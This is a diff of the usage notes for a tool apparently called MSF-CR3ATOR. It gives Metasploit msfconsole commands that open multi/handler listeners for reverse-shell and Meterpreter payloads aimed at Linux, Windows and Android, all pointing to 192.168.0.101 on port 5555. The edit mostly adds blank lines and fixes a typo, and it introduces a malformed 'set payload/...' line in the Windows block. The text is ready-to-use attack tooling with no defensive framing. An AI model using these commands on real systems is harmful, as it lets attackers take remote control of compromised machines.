@@ -10,20 +10,30 @@ cd MSF-CR3ATOR ; python3 creator.py
 	>>>>>>>> LINUX <<<<<<<<<
 -------------------------------------------------
 msfconsole
+
 use exploit/multi/handler
+
 set payload linux/x64/meterpreter_reverse_tcp
+
 set lhost 192.168.0.101
+
 set lport 5555
+
 exploit
 
 -------------------------------------------------
 	>>>>>>>> WINDOWS <<<<<<<<<
 -------------------------------------------------
 msfconsole
-se exploit/multi/handler
-use payload/windows/shell/reverse_tcp
+
+use exploit/multi/handler
+
+set payload/windows/shell/reverse_tcp
+
 set lhost 192.168.0.101
+
 set lport 5555
+
 exploit
 
 
@@ -31,9 +41,14 @@ exploit
 	>>>>>>>> ANDROID <<<<<<<<<
 -------------------------------------------------
 msfconsole
+
 use exploit/multi/handler
+
 set payload android/meterpreter/reverse_tcp 
+
 set lhost 192.168.0.101
+
 set lport 5555
+
 exploit
 
